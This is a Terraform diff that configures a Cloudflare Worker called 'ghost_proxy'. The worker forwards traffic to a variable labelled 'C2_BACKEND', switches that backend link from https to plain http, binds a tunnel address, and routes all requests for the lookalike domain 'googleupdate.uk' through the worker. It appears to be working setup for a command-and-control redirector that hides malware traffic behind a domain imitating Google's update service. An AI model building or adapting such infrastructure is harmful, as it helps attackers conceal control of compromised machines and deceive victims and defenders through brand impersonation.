@@ -7,7 +7,6 @@ terraform {
   }
 }
 
-
 # Read the JavaScript file
 data "local_file" "worker_script" {
   filename = var.worker_script_path
@@ -19,16 +18,22 @@ resource "cloudflare_workers_script" "ghost_proxy" {
   content    = file(var.worker_script_path)
   module     = true
 
-  # Pass the CloudFront URL to the Worker
- plain_text_binding {
+  # Pass the GCP LB IP to the Worker as backend
+  plain_text_binding {
     name = "C2_BACKEND"
-    text = "https://${var.c2_backend_url}"
+    text = "http://${var.c2_backend_url}"
   }
 
-  # ADD THIS BLOCK:
+  # Local tunnel bridge binding
   plain_text_binding {
     name = "LOCAL_TUNNEL"
-    # Tunnels use a unique internal address ending in cfargotunnel.com
-    text = "https://${var.local_tunnel_cname}" 
+    text = "https://${var.local_tunnel_cname}"
   }
+}
+
+# --- Route the Worker to the googleupdate.uk domain ---
+resource "cloudflare_workers_route" "c2_route" {
+  zone_id = var.cloudflare_zone_id
+  pattern = "googleupdate.uk/*"
+  script_name  = cloudflare_workers_script.ghost_proxy.name
 }
